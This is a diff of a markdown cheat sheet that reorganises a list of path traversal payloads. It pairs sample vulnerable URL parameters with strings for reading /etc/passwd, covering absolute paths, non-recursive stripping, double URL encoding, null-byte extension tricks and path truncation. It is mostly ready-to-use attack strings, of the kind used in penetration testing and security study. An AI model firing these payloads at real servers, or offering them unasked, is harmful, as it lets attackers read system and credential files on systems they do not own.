@@ -1,29 +1,35 @@
 ***
 - Identify a urls such as
-- `example.com/image?filename=img.jpg`
-- `example.com/getUserProfile.jsp?item=ikki.html`
-- `example.com/index.php?file=content`
-- `example.com/main.cgi?home=index.html`
-- File Path traversal simple case: `../../../../etc/passwd`
-- Traversal sequences blocked with absolute path bypass `/etc/passwd`
-- Traversal sequences stripped non-recursively `....//....//....//etc/passwd` or
+	- `example.com/image?filename=img.jpg`
+	- `example.com/getUserProfile.jsp?item=ikki.html`
+	- `example.com/index.php?file=content`
+	- `example.com/main.cgi?home=index.html`
+- File Path traversal simple case: 
+	- `../../../../etc/passwd`
+- Traversal sequences blocked with absolute path bypass 
+	- `/etc/passwd`
+- Traversal sequences stripped non-recursively 
+	- `....//....//....//etc/passwd`
 	- `..././..././..././..././etc/passwd`
 	- `....\/....\/....\/etc/passwd`
+- Traversal sequences stripped with superfluous URL-decode and double encode
+	- `..%252f..%252f..%252fetc/passwd
 	- `%5c..%5c..%5c..%5cetc%5cpasswd`
 	- `..%252f..%252f..%252fetc%252fpasswd`
 	- `..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`
 	- `%252e%252e%252fetc%252fpasswd`
-	- `%252e%252e%252fetc%252fpasswd%00`
-- Traversal sequences stripped with superfluous URL-decode `..%252f..%252f..%252fetc/passwd`
-- Validation of start of path `/var/www/images/../../../etc/passwd`
-- validation of file extension with null byte bypass `../../../etc/passwd%00.png` or `../../../etc/passwd%00`
+- Validation of start of path 
+	- `/var/www/images/../../../etc/passwd`
+- validation of file extension with null byte bypass
+	- `../../../etc/passwd%00.png` 
+	- `../../../etc/passwd%00`
+	-  `%252e%252e%252fetc%252fpasswd%00`
 - Path truncation:
-- `a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.`
-- `a/../../../../../../../../../etc/passwd/././.[ADD MORE]`
-- `a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.`
-- `a/../../../../[ADD MORE]../../../../../etc/passwd`
-
-*This vulnerability was corrected in PHP 5.3*
+	- `a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.`
+	- `a/../../../../../../../../../etc/passwd/././.[ADD MORE]`
+	- `a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.`
+	- `a/../../../../[ADD MORE]../../../../../etc/passwd`
+		*This vulnerability was corrected in PHP 5.3*
 ***
 Interesting files to find on Linux system:
 **OS Version**
